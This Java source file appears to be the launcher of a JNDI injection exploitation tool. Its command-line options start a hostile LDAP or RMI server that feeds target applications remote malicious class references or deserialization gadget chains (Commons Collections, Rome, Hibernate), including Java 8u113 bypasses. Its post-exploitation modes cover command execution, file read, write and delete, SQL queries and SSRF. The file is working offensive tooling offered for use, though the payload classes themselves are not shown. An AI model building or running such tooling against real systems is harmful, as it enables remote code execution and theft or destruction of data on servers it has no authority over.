package top.racerz.server;

import picocli.CommandLine;
import top.racerz.utils.Logger;
import top.racerz.utils.StringUtil;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.concurrent.Callable;


@CommandLine.Command(
        header = "   d88b d8b   db d8888b. d888888b      d88888b db    db d8888b. \n" +
                "   `8P' 888o  88 88  `8D   `88'        88'     `8b  d8' 88  `8D \n" +
                "    88  88V8o 88 88   88    88         88ooooo  `8bd8'  88oodD' \n" +
                "    88  88 V8o88 88   88    88         88~~~~~  .dPYb.  88~~~   \n" +
                "db. 88  88  V888 88  .8D   .88.        88.     .8P  Y8. 88      \n" +
                "Y8888P  VP   V8P Y8888D' Y888888P      Y88888P YP    YP 88      \n" +
                " @author RacerZ\n\n"
)
public class ServerStart implements Callable<Integer> {
    @CommandLine.Option(names = {"-s", "--server"}, description = "host for the server(local test or remote)")
    private String addr;

    @CommandLine.Option(names = {"-S", "--service"}, description = "provide evil service \n" +
            "The provided service are as follows: \n" +
            "[1] LDAPServer \n" +
            "[2] RMIServer", required = true)
    private String service;

    @CommandLine.Option(names = {"-p", "--port"}, description = "port on which the service accepts request", required = true)
    private int port;

    @CommandLine.Option(names = {"-l", "--listen"}, description = "port on which the Jetty accepts request")
    private int httpPort;

    @CommandLine.Option(names = {"-o", "--option"}, description = "specify a attack mode(num)" + "\n" +
            "The ldap service attack options are as follows: \n" +
            "[1] Reference (load remote evil file) \n" +
            "[2] SerializedData (load evil serialized data) \n" +
            "[3] SerializedDataInReference (Another way to load evil serialized data) \n" +
            "The rmi service attack options are as follows: \n" +
            "[1] Reference (load remote evil file) \n" +
            "[2] Bypass 8u113 (load local class -- Tomcat) \n" +
            "[3] Bypass 8u113 (load local class -- Groovy) \n", required = true)
    private int option;

    @CommandLine.Option(names = {"-e", "--exploit"}, description = "specify a exploit mode" + "\n" +
            "The exploit options are as follows: \n" +
            "[1] Command \n" +
            "[2] DirList \n" +
            "[3] FileRead \n" +
            "[4] FileWrite \n" +
            "[5] FileDelete \n" +
            "[6] BasicInfo \n" +
            "[7] SQLQuery  \n" +
            "[8] SSRF", required = true)
    private String exploit;

    // TODO 反序列化目前就简单提供了一个命令执行的功能：配合 Command 的 exploit
    @CommandLine.Option(names = {"-g", "--gadget"}, description = "specify a gadget chain" + "\n" +
            "The available gadget chains are as follows: \n" +
            "[1] CC2、4、5、6、7、8、9、10 (CC2 in default)\n" +
            "[2] Rome\n" +
            "[3] Hibernate")
    private String gadget;

    @CommandLine.Option(names = {"-h", "--help"}, usageHelp = true, description = "display this help message")
    boolean usageHelpRequested;


    // 先从 cli 中获取 如果不存在则手动获取
    private void getIpAddr() {
        if (!StringUtil.isNotEmpty(this.addr)) {
            this.addr = getLocalIpByNetCard();
        }
    }

    // 获取本机 ip 地址
    private String getLocalIpByNetCard() {
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface item = networkInterfaces.nextElement();
                // 获得与该网络接口绑定的 IP 地址，一般只有一个
                for (InterfaceAddress address : item.getInterfaceAddresses()) {
                    if (item.isLoopback() || !item.isUp()) {
                        continue;
                    }
                    // Effectively this tells you if the address you have is definitely not a public one
                    if (address.getAddress() instanceof Inet4Address && !address.getAddress().isSiteLocalAddress()) {
                        Inet4Address inet4Address = (Inet4Address) address.getAddress();
                        return inet4Address.getHostAddress();
                    }
                }
            }
            // 外网 IP 不存在的话，那么就获取内网 IP
            return InetAddress.getLocalHost().getHostAddress();

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public Integer call() throws Exception {
        getIpAddr();
        Thread thread = null;

        switch (service) {
            case "LDAPServer": {
                LDAPServer ldapServer = new LDAPServer(addr, port, httpPort, option, exploit, gadget);
                ldapServer.run();
                // TODO: 似乎是线程的问题
                Thread.sleep(100000);
                break;
            }
            case "RMIServer": {
                RMIServer rmiServer = new RMIServer(addr, httpPort, port, option, exploit);
                rmiServer.run();
                break;
            }
            default: {
                Logger.error("Invalid Option!");
                throw new RuntimeException();
            }
        }


        return 0;
    }

    public static void main(String[] args) throws Exception {

        int exitCode = new CommandLine(new ServerStart()).execute(args);
        System.exit(exitCode);

    }


}
